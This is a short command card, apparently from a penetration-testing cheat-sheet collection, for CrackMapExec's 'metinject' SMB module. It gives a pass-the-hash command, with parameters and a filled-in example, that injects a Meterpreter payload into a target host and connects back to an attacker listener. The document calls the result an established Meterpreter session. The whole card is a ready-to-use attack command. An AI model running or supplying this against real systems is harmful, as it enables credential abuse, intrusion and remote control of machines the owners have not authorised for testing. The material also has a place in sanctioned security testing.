---
type: command
executor: bash
data: >-
  cme smb $_TARGET -u $_USER -H $_HASH -M metinject -o LHOST=$_LHOST
  LPORT=$_LPORT
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - payload-injection
verified: true
validated: true
---

# cme-smb-metinject

## Command

```bash
cme smb $_TARGET -u $_USER -H $_HASH -M metinject -o LHOST=$_LHOST LPORT=$_LPORT
```

## Description

Injects Meterpreter payload via SMB.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target | Yes |
| -u $_USER | User | Yes |
| -H $_HASH | Hash | Yes |
| -M metinject | Module | Yes |
| -o LHOST=$_LHOST | Listener host | Yes |
| LPORT=$_LPORT | Listener port | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Admin -H hash -M metinject -o LHOST=192.168.1.63 LPORT=4443
```

## Expected Output

"Meterpreter session established".

## Related

- [[tools/CrackMapExec]]
